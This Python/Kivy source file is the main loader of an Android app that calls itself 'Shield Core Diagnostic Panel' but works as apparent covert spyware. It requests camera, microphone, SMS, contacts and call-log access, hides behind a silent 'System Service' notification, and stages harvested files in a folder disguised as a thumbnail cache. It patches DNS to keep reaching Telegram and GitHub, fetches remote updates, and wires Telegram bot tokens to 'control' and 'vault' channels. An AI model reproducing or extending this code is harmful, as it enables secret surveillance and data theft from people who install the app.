# -*- coding: utf-8 -*-
import os
import sys
import threading
import importlib
import requests
import traceback
import gc
import time
import socket
import random
import shutil
import hashlib
import json
from datetime import datetime

from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

# ======================== DNS PATCH (احتياطي ذكي) ============================
def _patch_dns():
    original_getaddrinfo = socket.getaddrinfo

    def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
        try:
            result = original_getaddrinfo(host, port, family, type, proto, flags)
            if result:
                return result
        except:
            pass

        override = {
            'raw.githubusercontent.com': [
                '185.199.108.133', '185.199.109.133',
                '185.199.110.133', '185.199.111.133'
            ],
            'api.telegram.org': [
                '149.154.167.220', '149.154.167.221',
                '149.154.167.99', '149.154.175.50'
            ],
            'zaen1993.github.io': [
                '185.199.108.153', '185.199.109.153',
                '185.199.110.153', '185.199.111.153'
            ],
            'cdn.jsdelivr.net': [
                '151.101.2.229', '151.101.66.229',
                '151.101.130.229'
            ]
        }
        if host in override:
            fake_ip = random.choice(override[host])
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
        return original_getaddrinfo(host, port, family, type, proto, flags)

    socket.getaddrinfo = patched_getaddrinfo

_patch_dns()

# ========================== ثوابت التطبيق ================================
APP_VERSION = "4.2.1"   # غيّره مع كل تحديث لضمان تنظيف الملفات القديمة

# قائمة روابط index.json (مع خيارات بديلة)
INDEX_BASE_URLS = [
    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
    "https://zaen1993.github.io/Android-Core/index.json",
    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
}

# ====================== تنظيف الملفات القديمة عند اختلاف الإصدار ======================
def _clean_old_runtime(base_path):
    """حذف مجلد النظام إذا كان الإصدار مختلفاً (تثبيت جديد أو تحديث)"""
    runtime_dir = os.path.join(base_path, ".sys_runtime")
    version_file = os.path.join(runtime_dir, "version.txt")
    current_version = APP_VERSION

    if os.path.exists(runtime_dir):
        old_version = ""
        if os.path.exists(version_file):
            try:
                with open(version_file, 'r') as f:
                    old_version = f.read().strip()
            except:
                pass

        if old_version != current_version:
            try:
                shutil.rmtree(runtime_dir)
                print(f"🧹 Old runtime files removed (v{old_version})")
            except Exception as e:
                print(f"⚠️ Cleanup error: {e}")

    os.makedirs(runtime_dir, exist_ok=True)

    try:
        with open(version_file, 'w') as f:
            f.write(current_version)
    except Exception as e:
        print(f"⚠️ Could not write version file: {e}")

def _get_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
    except:
        base = os.getcwd()

    _clean_old_runtime(base)
    p = os.path.join(base, ".sys_runtime")
    os.makedirs(p, exist_ok=True)
    return p

R = _get_path()
U = os.path.join(R, "updates")
os.makedirs(U, exist_ok=True)

HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
os.makedirs(HARVEST_QUEUE, exist_ok=True)

MODELS_DIR = os.path.join(R, "models")
os.makedirs(MODELS_DIR, exist_ok=True)

if R not in sys.path:
    sys.path.insert(0, R)

# ======================== الخدمات الخلفية ====================================
def start_silent_service():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        nm = autoclass('android.app.NotificationManager')
        ch = autoclass('android.app.NotificationChannel')
        
        # استخدام قناة إشعارات بأولوية منخفضة
        channel = ch("system_channel", "System Service", nm.IMPORTANCE_LOW)
        act.getSystemService(nm).createNotificationChannel(channel)

        builder = autoclass('android.app.Notification$Builder')(act, "system_channel")
        
        # ✅ التصحيح 1: استخدام الأيقونة الشفافة بدلاً من أيقونة التطبيق
        try:
            # محاولة استخدام الأيقونة الشفافة
            icon_id = act.getResources().getIdentifier("ic_notification", "drawable", act.getPackageName())
            if icon_id > 0:
                builder.setSmallIcon(icon_id)
            else:
                # في حالة عدم وجود الأيقونة، استخدم أيقونة التطبيق كحل احتياطي
                builder.setSmallIcon(act.getApplicationInfo().icon)
        except Exception as e:
            # في حالة أي خطأ، استخدم أيقونة التطبيق
            builder.setSmallIcon(act.getApplicationInfo().icon)
            print(f"⚠️ Notification icon fallback: {e}")
        
        builder.setContentTitle("System Service")
        builder.setContentText("Running in background")
        builder.setPriority(autoclass('android.app.Notification').PRIORITY_MIN)
        builder.setOngoing(False)
        builder.setAutoCancel(True)
        builder.setSound(None)
        builder.setVibrate(None)
        
        act.startForeground(9921, builder.build())
        return True, "Foreground service started successfully."
    except Exception as e:
        return False, f"Foreground service warning: {e}"

def open_notification_settings():
    try:
        from jnius import autoclass
        Intent = autoclass('android.content.Intent')
        Settings = autoclass('android.provider.Settings')
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
        intent.putExtra(Settings.EXTRA_APP_PACKAGE, ctx.getPackageName())
        ctx.startActivity(intent)
    except Exception as e:
        print(f"⚠️ Could not open notification settings: {e}")

def _perms():
    msg_list = []
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.READ_CALL_LOG"
        ])
        msg_list.append("• Requested all Android System Permissions.")
    except Exception as e:
        msg_list.append(f"• Permissions Error: {e}")

    ok, svc_msg = start_silent_service()
    msg_list.append(f"• {svc_msg}")

    def delayed_notification_settings():
        time.sleep(2)
        open_notification_settings()
    threading.Thread(target=delayed_notification_settings, daemon=True).start()

    try:
        from jnius import autoclass
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        pm = ctx.getSystemService(ctx.POWER_SERVICE)
        if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
            Intent = autoclass('android.content.Intent')
            intent = Intent(Intent.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            from android.net import Uri
            intent.setData(Uri.parse(f"package:{ctx.getPackageName()}"))
            ctx.startActivity(intent)
    except Exception as e:
        msg_list.append(f"• Battery exemption warning: {e}")

    return "\n".join(msg_list)

# ======================== تحميل الإعدادات ====================================
def load_secrets_from_config():
    config_module = None
    try:
        config_module = importlib.import_module("config_template")
    except ImportError:
        try:
            config_module = importlib.import_module("config")
        except ImportError:
            print("⚠️ Warning: No config file found, using defaults")
            return [], [], -1003943094277, -1003577715762, None

    if not hasattr(config_module, 'load_config'):
        print("⚠️ Warning: Config file has no load_config function")
        return [], [], -1003943094277, -1003577715762, None

    try:
        active, reserve, ctrl, vault, secret = config_module.load_config()
        if not active:
            active = []
        if not reserve:
            reserve = []
        if not ctrl:
            ctrl = -1003943094277
        if not vault:
            vault = -1003577715762
        # ✅ التصحيح: لا تستخدم قيمة افتراضية ثابتة لكلمة السر
        if not secret:
            secret = None
        return active, reserve, ctrl, vault, secret
    except Exception as e:
        print(f"⚠️ Error loading config: {e}, using defaults")
        return [], [], -1003943094277, -1003577715762, None

# ================== تحميل ملف index.json والتحقق من الإصدارات ==================
def fetch_index():
    """تحميل ملف index.json من الروابط المتعددة مع التحقق من الإصدار"""
    for url in INDEX_BASE_URLS:
        try:
            resp = requests.get(url, headers=HEADERS, timeout=15, verify=True)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    # ✅ التصحيح 2: التحقق من توافق الإصدارات
                    if 'version' in data:
                        index_version = data['version']
                        # مقارنة الإصدار الرئيسي (major version)
                        app_major = APP_VERSION.split('.')[0]
                        index_major = index_version.split('.')[0]
                        if app_major != index_major:
                            print(f"⚠️ Version mismatch: App={APP_VERSION}, Index={index_version}")
                            return None
                        print(f"✅ Version compatible: App={APP_VERSION}, Index={index_version}")
                    return data
                except json.JSONDecodeError:
                    continue
        except Exception as e:
            print(f"⚠️ Failed to fetch from {url}: {e}")
            continue
    return None

def download_file_with_checksum(url, dest_path, expected_sha256=None, max_retries=3):
    """تحميل ملف مع التحقق من SHA-256 (التصحيح 3)"""
    for attempt in range(max_retries):
        try:
            # إنشاء المجلد الوجهة إذا لم يكن موجوداً
            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
            
            # تحميل الملف
            resp = requests.get(url, headers=HEADERS, timeout=30, verify=True)
            if resp.status_code != 200:
                print(f"⚠️ Download failed: HTTP {resp.status_code}")
                time.sleep(2)
                continue
            
            # كتابة الملف
            with open(dest_path, 'wb') as f:
                f.write(resp.content)
            
            # التحقق من Checksum إذا كان متوفراً
            if expected_sha256:
                sha256_hash = hashlib.sha256()
                with open(dest_path, 'rb') as f:
                    for chunk in iter(lambda: f.read(4096), b""):
                        sha256_hash.update(chunk)
                actual_sha256 = sha256_hash.hexdigest()
                
                if actual_sha256.lower() != expected_sha256.lower():
                    os.remove(dest_path)
                    print(f"⚠️ Checksum mismatch for {dest_path}. Expected: {expected_sha256}, Got: {actual_sha256}")
                    time.sleep(2)
                    continue
            
            # التحقق من أن الملف ليس فارغاً
            if os.path.getsize(dest_path) == 0:
                os.remove(dest_path)
                print(f"⚠️ Downloaded file is empty: {dest_path}")
                time.sleep(2)
                continue
            
            return True
            
        except Exception as e:
            print(f"⚠️ Download error (attempt {attempt+1}): {e}")
            if os.path.exists(dest_path):
                try:
                    os.remove(dest_path)
                except:
                    pass
            time.sleep(2)
    
    return False

# ================== نسخ نموذج الذكاء الاصطناعي (محلياً فقط) ==================
def copy_model_to_models_dir():
    try:
        model_min_size = 5_000_000   # 5 ميغابايت
        dest = os.path.join(MODELS_DIR, "engine_v2.tflite")

        # ✅ التصحيح 4: إنشاء المجلد الوجهة قبل المحاولة
        os.makedirs(MODELS_DIR, exist_ok=True)

        if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
            return True, f"Model exists at destination ({os.path.getsize(dest)/1024/1024:.2f} MB)"

        possible_paths = [
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets", "engine_v2.tflite"),
            os.path.join(os.getcwd(), "assets", "engine_v2.tflite"),
            "/data/data/com.sys.shieldcore/files/app/assets/engine_v2.tflite",
            "/data/data/com.sys.shieldcore/files/assets/engine_v2.tflite",
        ]

        for src in possible_paths:
            if os.path.exists(src):
                size = os.path.getsize(src)
                if size >= model_min_size:
                    try:
                        shutil.copy2(src, dest)
                        if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
                            return True, f"Model copied from assets ({size/1024/1024:.2f} MB)"
                    except Exception as e:
                        print(f"⚠️ Copy failed from {src}: {e}")
                        continue

        # ✅ التصحيح 4: في حالة الفشل، سجل تحذيراً واضحاً
        return False, "CRITICAL: engine_v2.tflite missing from assets! AI features will be disabled."
    except Exception as e:
        return False, f"Model copy failure: {e}"

# ============================== تطبيق Kivy ====================================
class CoreApp(App):
    def build(self):
        self.title = "Shield Core v4.2 Diagnostic Panel"

        layout = BoxLayout(orientation='vertical', padding=8, spacing=8)

        self.log = TextInput(
            text="=== Shield Core v4.2 Dynamic Diagnostics ===\n",
            readonly=True,
            background_color=(0.05, 0.05, 0.07, 1),
            foreground_color=(0.2, 0.95, 0.4, 1),
            font_size='11sp',
            do_wrap=True,
            auto_indent=False
        )

        btns = BoxLayout(size_hint=(1, 0.09), spacing=8)

        copy_btn = Button(
            text="📋 COPY LOG",
            background_color=(0.15, 0.45, 0.85, 1),
            font_size='12sp',
            bold=True
        )
        copy_btn.bind(on_press=self._copy)

        clear_btn = Button(
            text="🗑 CLEAR",
            background_color=(0.85, 0.2, 0.2, 1),
            font_size='12sp',
            bold=True
        )
        clear_btn.bind(on_press=self._clear)

        btns.add_widget(copy_btn)
        btns.add_widget(clear_btn)

        layout.add_widget(self.log)
        layout.add_widget(btns)

        Clock.schedule_once(self._start, 0.5)
        return layout

    def append_log(self, text):
        def _add_text(dt):
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.log.text += f"[{timestamp}] {text}\n"
        Clock.schedule_once(_add_text)

    def _copy(self, instance):
        try:
            Clipboard.copy(self.log.text)
            self.append_log("✅ Logs copied to clipboard successfully.")
        except Exception as e:
            self.append_log(f"❌ Copy failed: {e}")

    def _clear(self, instance):
        self.log.text = "=== Log Reset ===\n"

    def _start(self, dt):
        threading.Thread(target=self._init_core_async, daemon=True).start()

    def _init_core_async(self):
        self.append_log("🚀 Initiating system diagnostic checks...")

        # 1. الصلاحيات والخدمات
        self.append_log("⚙️ Step 1/5: Checking system permissions & foreground service...")
        perm_res = _perms()
        self.append_log(perm_res)

        # 2. ملف الموديل
        self.append_log("🧠 Step 2/5: Verifying AI Model file (engine_v2.tflite)...")
        m_ok, m_msg = copy_model_to_models_dir()
        if m_ok:
            self.append_log(f"✅ AI Model: {m_msg}")
        else:
            self.append_log(f"❌ AI Model ERROR: {m_msg}")

        # 3. تكوين النظام
        self.append_log("🔑 Step 3/5: Loading configuration & Telegram credentials...")
        try:
            active, reserve, ctrl, vault, secret = load_secrets_from_config()
            self.append_log(f"• Tokens loaded: Active({len(active)}), Reserve({len(reserve)})")
            self.append_log(f"• Control ID: {ctrl} | Vault ID: {vault}")
            if secret:
                self.append_log("• Secret: ✅ Configured")
            else:
                self.append_log("• Secret: ⚠️ Not set (login disabled)")
        except Exception as e:
            self.append_log(f"❌ Config Load Error: {e}\n{traceback.format_exc()}")
            active, reserve, ctrl, vault, secret = [], [], -1003943094277, -1003577715762, None

        # 4. المكونات الداخلية
        self.append_log("🧩 Step 4/5: Initializing Monitor & Handlers...")
        try:
            from monitor import M
            mon = M()
            self.append_log(f"• Device Registered: {mon.dmd} ({mon.did})")

            from telegram_ui import T
            ui = T(mon, active, reserve, ctrl, vault, secret)

            mon.ui = ui
            mon.ctrl = ctrl
            mon.vlt = vault

            # 5. تشغيل المحركات
            self.append_log("📡 Step 5/5: Starting Monitor and Telegram UI Listeners...")
            ui.start()
            
            # ✅ التصحيح 5: تشغيل mon.start() في خيط منفصل مع تأخير
            def start_monitor():
                time.sleep(1)
                try:
                    mon.start()
                    self.append_log("✅ Monitor started successfully.")
                except Exception as e:
                    self.append_log(f"❌ Monitor start error: {e}")
            
            threading.Thread(target=start_monitor, daemon=True).start()

            self.mon = mon
            self.ui = ui

            self.append_log("🎉 ALL SYSTEMS OPERATIONAL! Monitoring active logs...")
        except Exception as e:
            self.append_log(f"💥 CRITICAL INITIALIZATION ERROR:\n{traceback.format_exc()}")

    def on_stop(self):
        try:
            if hasattr(self, 'mon') and self.mon:
                self.mon.stop()
            if hasattr(self, 'ui') and self.ui:
                self.ui.stop()
            self.append_log("✅ Application stopped cleanly")
        except Exception as e:
            self.append_log(f"⚠️ Stop error: {e}")

if __name__ == '__main__':
    CoreApp().run()
